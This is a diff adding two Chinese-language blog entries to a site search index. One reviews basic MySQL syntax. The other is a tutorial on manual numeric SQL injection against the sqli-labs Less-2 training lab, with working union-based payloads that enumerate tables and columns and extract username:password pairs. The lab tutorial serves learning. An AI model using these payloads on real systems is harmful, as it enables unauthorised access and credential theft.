@@ -1999,4 +1999,29 @@
         <tag>SQL</tag>
       </tags>
   </entry>
+  <entry>
+    <title>MySQL语句语法回顾</title>
+    <url>/2025/02/27/20250227-04.html</url>
+    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询当前数据库服务器所有的数据库</span><br><span class="line">show databases;</span><br><span class="line">选中某个数据库</span><br><span class="line">use 数据库名字 test</span><br><span class="line">查询当前数据库所有的表</span><br><span class="line">show tables；</span><br><span class="line">查询t1表所有数据</span><br><span class="line">查询关键字 select </span><br><span class="line">* 所有</span><br><span class="line">from  表名</span><br><span class="line">select * from t1;</span><br><span class="line">条件查询 id=2</span><br><span class="line">where 条件  编程 if（条件 true）&#123;执行&#125;</span><br><span class="line">select * from t1 where id=2；</span><br><span class="line">查询id=2   pass =111</span><br><span class="line">union 合并查询 </span><br><span class="line">2个特性：</span><br><span class="line">前面查询的语句和后面的查询语句结果互不干扰</span><br><span class="line">前面的查询语句的字段数量和后面的查询语句字段数量要一致</span><br><span class="line"></span><br><span class="line">* == 3</span><br><span class="line">select id from t1 where id=-1 union select * from t1 where pass =111;</span><br><span class="line"></span><br><span class="line">order by 排序</span><br><span class="line">order by 字段名字  id  也可以 跟上数字 1 2 3 4 .。。。。。</span><br><span class="line"></span><br><span class="line">猜解表的列数 知道表有几列  </span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入之MySQL手工注入之数字型注入</title>
+    <url>/2025/03/04/20250304-01.html</url>
+    <content><![CDATA[<p>本章节重点在于熟悉注入流程，以及注入原理。练习靶场为sqli-labs第二关数字型注入。</p>
+<h1 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h1><p><img src="/./assets/20250304/84e4234864c844deaedd40fbfcda1477.png" alt="数字型注"></p>
+<p>在url中输入id值，执行查询sql语句，即可得到对应数据</p>
+<p>less-2源码分析：</p>
+<p><img src="/./assets/20250304/ac74d24f543347eaa6d8e90685e70281.png" alt="less-2源码"></p>
+<p>浏览器 进行数据提交 服务器：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get 提交  ：  url   数据长度 </span><br><span class="line">     速度快  </span><br><span class="line">	 用于： </span><br><span class="line"></span><br><span class="line">post 提交 ： 服务器    安全性   数据量 </span><br></pre></td></tr></table></figure>
+
+<h1 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h1><p><img src="/./assets/20250304/85375d4d5d324ced94ef53b44a7be7a6.png" alt="SQL注入流程"></p>
+<h1 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尝试手工注入：</span><br><span class="line">	SQL注入： </span><br><span class="line">		1.判断有无注入点   and 1 = 1； true </span><br><span class="line">		随便输入内容  ==  报错  注入</span><br><span class="line">		              ==  没有注入</span><br><span class="line">		2.猜解列名数量 order by %20 空格</span><br><span class="line">		字段 4个</span><br><span class="line"></span><br><span class="line">		3.报错，判断回显点 union </span><br><span class="line">		4.信息收集 </span><br><span class="line">		  数据库版本 version()</span><br><span class="line">		  高版本：5.0  </span><br><span class="line">			系统库： infromation 。。。</span><br><span class="line">		  数据库名称：database（）</span><br><span class="line">		  低版本：5.0 </span><br><span class="line">		5.使用对应SQL进行注入  </span><br><span class="line">			数据库库名：security</span><br><span class="line">		. 下一级  </span><br><span class="line">		infromation_schema.tables 查找表名</span><br><span class="line">		table_name</span><br><span class="line">		查询serurity库下面 所有的表名 </span><br><span class="line">		database（）</span><br><span class="line"></span><br><span class="line">		= 前后 连到一起</span><br><span class="line">		union select 1,group_concat(table_name),3 from information_schema.tables</span><br><span class="line">		where table_schema=database()</span><br><span class="line"></span><br><span class="line">		表： users</span><br><span class="line">		如何查询表里面有那些字段？ </span><br><span class="line">		user 字符 转行 16进制</span><br><span class="line">		union select 1,group_concat(column_name),3 from information_schema.columns</span><br><span class="line">		where table_name=0x7573657273</span><br><span class="line"></span><br><span class="line">		username  password  字段数据  </span><br><span class="line">		select username,password from users</span><br><span class="line">		0x3a  :</span><br><span class="line">		union select 1,2,(select group_concat(username,0x3a,password)from users)</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>MySQL</tag>
+      </tags>
+  </entry>
 </search>
